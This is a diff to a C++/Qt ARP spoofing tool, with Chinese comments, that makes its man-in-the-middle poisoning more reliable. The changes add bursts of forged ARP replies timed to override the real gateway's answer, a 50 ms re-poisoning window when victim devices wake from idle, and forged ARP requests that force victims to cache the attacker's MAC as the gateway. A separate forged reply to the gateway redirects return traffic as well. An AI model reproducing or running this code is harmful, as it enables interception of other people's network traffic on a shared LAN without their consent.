@@ -14,12 +14,23 @@
 static constexpr int kSpoofIntervalMs = 1000;
 // heal 连发遍数：多发几遍抵消可能滞留的欺骗缓存，确保设备恢复联网。
 static constexpr int kHealRepeat = 3;
+// 唤醒沿高频窗口：50ms 一发、跑 8 拍（≈400ms）。空闲后设备重新解析网关那一瞬，1s 的周期重发太慢
+// ——真网关的解析应答会先落地把设备夺回；这 400ms 高频重投把这段过渡期压过去，直到稳态接管。
+static constexpr int kBoostIntervalMs = 50;
+static constexpr int kBoostTicks = 8;
+// ARP 抢答的「短促连发」延迟：真网关也会应答同一个请求，一发抢答不保证是「最后写入者」。除了当场
+// 连发两帧，再在 5ms / 18ms 各补一帧，把真网关那一发（软件转发路径通常更慢）盖回去。
+static constexpr int kAnswerBurstDelay1Ms = 5;
+static constexpr int kAnswerBurstDelay2Ms = 18;
 
 ArpSpoofer::ArpSpoofer(IL2Endpoint *endpoint, QObject *parent)
-    : QObject(parent), m_endpoint(endpoint), m_timer(new QTimer(this))
+    : QObject(parent), m_endpoint(endpoint), m_timer(new QTimer(this)),
+      m_boostTimer(new QTimer(this))
 {
     m_timer->setInterval(kSpoofIntervalMs);
     connect(m_timer, &QTimer::timeout, this, &ArpSpoofer::tick);
+    m_boostTimer->setInterval(kBoostIntervalMs);
+    connect(m_boostTimer, &QTimer::timeout, this, &ArpSpoofer::boostTick);
 }
 
 ArpSpoofer::~ArpSpoofer()
@@ -70,8 +81,13 @@ void ArpSpoofer::stopSpoof(const QString &victimMac)
     if (configured())
         healOne(it->mac, it->ip); // 先还原再移除
     m_victims.erase(it);
-    if (m_victims.isEmpty() && m_timer->isActive())
-        m_timer->stop();
+    if (m_victims.isEmpty()) {
+        if (m_timer->isActive())
+            m_timer->stop();
+        if (m_boostTimer && m_boostTimer->isActive())
+            m_boostTimer->stop();
+        m_boostRemaining = 0;
+    }
 }
 
 bool ArpSpoofer::answerGatewayArp(const QByteArray &frame)
@@ -101,7 +117,19 @@ bool ArpSpoofer::answerGatewayArp(const QByteArray &frame)
     // 回一帧欺骗 reply 给设备：sha=本机MAC, spa=网关IP → 「网关在本机」。目的就是发起请求的设备。
     const QByteArray reply =
             buildArpReply(senderMac, m_localMac, m_localMac, m_gatewayIp, senderMac, senderIp);
+    // 短促连发（item 1）：当场两帧 + 5ms/18ms 各补一帧。真网关也会应答这次请求，只发一帧不保证
+    // 我们是设备最终采信的「最后写入者」；连发 + 延迟重盖把真网关那一发压回去。延迟帧发出前复核该
+    // victim 是否还在集合里（其间可能已 stopSpoof），避免对已还原的设备再投毒。
     m_endpoint->send(reply);
+    m_endpoint->send(reply);
+    QTimer::singleShot(kAnswerBurstDelay1Ms, this, [this, reply, senderMac] {
+        if (m_endpoint && hasVictimMac(senderMac))
+            m_endpoint->send(reply);
+    });
+    QTimer::singleShot(kAnswerBurstDelay2Ms, this, [this, reply, senderMac] {
+        if (m_endpoint && hasVictimMac(senderMac))
+            m_endpoint->send(reply);
+    });
     return true;
 }
 
@@ -118,6 +146,34 @@ void ArpSpoofer::reassertNow()
         sendSpoof(it.value());
 }
 
+void ArpSpoofer::startBoost()
+{
+    if (!configured() || m_victims.isEmpty())
+        return;
+    // 立刻推一轮（item 3 的「首包兜底」）：sendSpoof 里带 request-form，能把「网关在本机」装进设备
+    // **已老化删除**的空表项——赶在它排队的首包解析完成前钉好，首包因此不再走真路由/被丢。
+    for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
+        sendSpoof(it.value());
+    // 随后进入 50ms×N 的高频窗口（item 2），压过唤醒期真网关的解析应答，直到稳态接管。
+    m_boostRemaining = kBoostTicks;
+    if (m_boostTimer && !m_boostTimer->isActive())
+        m_boostTimer->start();
+}
+
+void ArpSpoofer::boostTick()
+{
+    if (!configured() || m_victims.isEmpty()) {
+        if (m_boostTimer)
+            m_boostTimer->stop();
+        m_boostRemaining = 0;
+        return;
+    }
+    for (auto it = m_victims.constBegin(); it != m_victims.constEnd(); ++it)
+        sendSpoof(it.value());
+    if (--m_boostRemaining <= 0 && m_boostTimer)
+        m_boostTimer->stop();
+}
+
 void ArpSpoofer::healAll()
 {
     if (configured()) {
@@ -127,6 +183,9 @@ void ArpSpoofer::healAll()
     m_victims.clear();
     if (m_timer && m_timer->isActive())
         m_timer->stop();
+    if (m_boostTimer && m_boostTimer->isActive())
+        m_boostTimer->stop();
+    m_boostRemaining = 0;
 }
 
 QStringList ArpSpoofer::victims() const
@@ -147,15 +206,22 @@ void ArpSpoofer::sendSpoof(const Target &t)
     if (!m_endpoint || !configured())
         return;
 
-    // (a) 发给 victim：sha=本机MAC，spa=网关IP → “网关 IP 在本机”，victim 出网走我们。
-    const QByteArray toVictim =
+    // (a) 发给 victim 的欺骗 reply：sha=本机MAC，spa=网关IP → “网关 IP 在本机”，victim 出网走我们。
+    const QByteArray replyToVictim =
         buildArpReply(t.mac, m_localMac, m_localMac, m_gatewayIp, t.mac, t.ip);
-    // (b) 发给网关：sha=本机MAC，spa=victimIP → “victim IP 在本机”，回程走我们。
-    const QByteArray toGateway =
+    // (a2) 再补一条**伪造 ARP request**（op=1，tpa=victimIP、tha=victimMAC；sender 仍是 网关IP/本机MAC）。
+    //   设备收到「目标是自己」的请求时按 RFC 826 **必须**处理 sender、把「网关 IP 在本机 MAC」装进缓存
+    //   并回应——**即使它的邻居表项此前已 STALE/老化删除**（现代系统对非请求 reply 视而不见，只认这条）。
+    //   这是「设备空闲后首次访问先失败/先走真路由」的根治：空闲期让缓存不掉、唤醒期让首包直接命中我们。
+    const QByteArray requestToVictim =
+        buildArpRequest(t.mac, m_localMac, m_localMac, m_gatewayIp, t.mac, t.ip);
+    // (b) 发给网关的欺骗 reply：sha=本机MAC，spa=victimIP → “victim IP 在本机”，回程走我们。
+    const QByteArray replyToGateway =
         buildArpReply(m_gatewayMac, m_localMac, m_localMac, t.ip, m_gatewayMac, m_gatewayIp);
 
-    m_endpoint->send(toVictim);
-    m_endpoint->send(toGateway);
+    m_endpoint->send(replyToVictim);
+    m_endpoint->send(requestToVictim);
+    m_endpoint->send(replyToGateway);
 }
 
 void ArpSpoofer::healOne(const QByteArray &victimMac, const QByteArray &victimIp)
@@ -207,11 +273,19 @@ QByteArray ArpSpoofer::ipToBytes(const QString &ip)
     return out;
 }
 
-QByteArray ArpSpoofer::buildArpReply(const QByteArray &ethDst, const QByteArray &ethSrc,
-                                     const QByteArray &senderMac, const QByteArray &senderIp,
-                                     const QByteArray &targetMac, const QByteArray &targetIp)
+bool ArpSpoofer::hasVictimMac(const QByteArray &mac6) const
 {
-    // 完整以太帧：14 字节以太头 + 28 字节 ARP 载荷 = 42 字节。
+    for (const Target &t : m_victims)
+        if (t.mac == mac6)
+            return true;
+    return false;
+}
+
+QByteArray ArpSpoofer::buildArp(quint8 op, const QByteArray &ethDst, const QByteArray &ethSrc,
+                                const QByteArray &senderMac, const QByteArray &senderIp,
+                                const QByteArray &targetMac, const QByteArray &targetIp)
+{
+    // 完整以太帧：14 字节以太头 + 28 字节 ARP 载荷 = 42 字节。op：1=request，2=reply。
     QByteArray f;
     f.reserve(42);
     f.append(ethDst);            // 目的 MAC (6)
@@ -224,11 +298,25 @@ QByteArray ArpSpoofer::buildArpReply(const QByteArray &ethDst, const QByteArray 
     f.append(char(0x00));
     f.append(char(0x06));        // hlen = 6
     f.append(char(0x04));        // plen = 4
-    f.append(char(0x00));        // op = 0x0002 (reply)
-    f.append(char(0x02));
+    f.append(char(0x00));        // op（高字节恒 0）
+    f.append(char(op));
     f.append(senderMac);         // sha (6)
     f.append(senderIp);          // spa (4)
     f.append(targetMac);         // tha (6)
     f.append(targetIp);          // tpa (4)
     return f;
+}
+
+QByteArray ArpSpoofer::buildArpReply(const QByteArray &ethDst, const QByteArray &ethSrc,
+                                     const QByteArray &senderMac, const QByteArray &senderIp,
+                                     const QByteArray &targetMac, const QByteArray &targetIp)
+{
+    return buildArp(0x02, ethDst, ethSrc, senderMac, senderIp, targetMac, targetIp);
+}
+
+QByteArray ArpSpoofer::buildArpRequest(const QByteArray &ethDst, const QByteArray &ethSrc,
+                                       const QByteArray &senderMac, const QByteArray &senderIp,
+                                       const QByteArray &targetMac, const QByteArray &targetIp)
+{
+    return buildArp(0x01, ethDst, ethSrc, senderMac, senderIp, targetMac, targetIp);
 }
